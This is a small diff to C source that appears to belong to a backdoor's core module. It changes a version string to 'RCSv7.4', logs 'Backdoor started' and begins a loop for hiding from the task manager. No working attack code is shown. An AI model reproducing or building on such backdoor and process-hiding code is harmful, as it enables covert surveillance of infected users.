@@ -2402,7 +2402,7 @@ void __stdcall HM_sMain(void)
 	// Fa partire il sync manager 
 	SM_StartMonitorEvents();
 
-	REPORT_STATUS_LOG("\r\n RCSv7.2 fully operational\r\n\r\n");
+	REPORT_STATUS_LOG("\r\n RCSv7.4 fully operational\r\n\r\n");
 	SendStatusLog(L"[Core Module]: Backdoor started");
 
 	// Ciclo per l'hiding da task manager e dai nuovi epxlorer
